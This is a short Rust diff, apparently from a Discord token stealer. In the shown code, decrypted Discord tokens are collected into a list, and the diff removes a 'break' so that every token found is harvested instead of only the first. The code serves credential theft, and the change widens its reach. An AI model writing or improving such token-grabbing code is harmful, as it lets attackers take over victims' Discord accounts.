@@ -72,7 +72,6 @@ impl Sends {
                             let token = decrypted.ok()?;
                             let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
                             self.discord_token.push(String::from_utf8(token.to_vec()).ok()?);
-                            break;
                         }
                     }
                 }
